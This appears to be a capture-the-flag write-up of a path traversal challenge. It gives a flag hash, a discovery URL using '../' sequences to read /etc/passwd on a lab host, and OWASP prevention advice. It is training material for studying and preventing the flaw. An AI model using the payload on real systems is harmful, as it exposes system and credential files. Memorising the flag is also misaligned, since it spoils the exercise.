# PATH TRAVERSAL

## Flag
```
b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
```

## Discovery
On the page  http://{IP_ADDRESS}/index.php


```diff
# element inspector
http://10.12.100.171/?page=../../../../../../../etc/passwd
```
## Use
> A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder.

## Prevention
> - Prefer working without user input when using file system calls
> - Use indexes rather than actual portions of file names when templating or using language files (ie value 5 from the user submission = Czechoslovakian, rather than expecting the user to return “Czechoslovakian”)
> - Ensure the user cannot supply all parts of the path – surround it with your path code
> - Validate the user’s input by only accepting known good – do not sanitize the data
> - Use chrooted jails and code access policies to restrict where the files can be obtained or saved to
> - If forced to use user input for file operations, normalize the input before using in file io API’s, such as normalize().


## Documentation
- [owasp - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

- [youtube - Path Traversal Attack Explication et Exploitation](https://www.youtube.com/watch?v=rK5TFXom34w&ab_channel=prodigiousMind)
---